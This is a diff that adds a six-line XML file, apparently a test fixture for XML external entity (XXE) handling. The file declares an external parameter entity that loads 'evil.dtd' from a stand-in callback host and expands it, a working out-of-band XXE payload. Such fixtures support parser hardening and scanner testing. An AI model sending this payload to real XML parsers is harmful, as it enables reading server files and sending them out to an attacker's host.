@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % dtd SYSTEM "http://CALLBACK_URL/evil.dtd">
+  %dtd;
+]>
+<root>test</root>
